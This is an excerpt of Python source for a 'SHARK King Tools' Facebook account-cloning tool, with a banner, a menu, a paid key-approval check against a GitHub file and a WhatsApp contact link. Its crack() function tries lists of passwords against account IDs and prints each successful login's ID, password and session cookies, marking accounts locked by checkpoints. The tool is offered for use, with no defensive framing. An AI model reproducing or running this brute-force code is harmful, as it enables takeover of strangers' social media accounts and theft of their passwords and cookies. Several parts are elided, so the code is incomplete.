...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mSHARK')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'SHARK' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  SHARK,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/SHARK.King.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;91m  SSSSS  HH   HH   AAA   RRRRRR  KK  KK║
║\033[0;91m  SS      HH   HH  AAAAA  RR   RR KK KK║
║\033[0;91m  SSSSS  HHHHHHH AA   AA RRRRRR  KKKK║
║\033[0;91m         SS HH   HH AAAAAAA RR  RR  KK KK║
║\033[0;91m  SSSSS  HH   HH AA   AA RR   RR KK  KK║
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING ONLY MOBILE DATA ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mDeap-SHARK ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Rakibul Islam ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mSHARK-King ]   ║\33[1;34m   
...
def login():
	banner()
	SHARKj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	SHARKj('\033[0;97m===============================================')
	SHARK= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if SHARK in ['m']:
		public()
	elif SHARK in ['1']:
		crack_file()
		...
		os.system('xdg-open https://wa.me/+8801816079858')
	elif SHARK in ['0']:
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGIN SHARK\n\x1b[1;97m [1] METHOD 1')
	os.system('espeak -a 300 " 1,  method,  1"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[SHARK-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#SHARK-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•SHARK-Cp] {idf} • {pw}')     
				...
				#SHARK-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•SHARK-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " SHARK,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/SHARK-King/Public-CloNing-42o/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m SHARK, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+SHARK+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+SHARK+''+key1
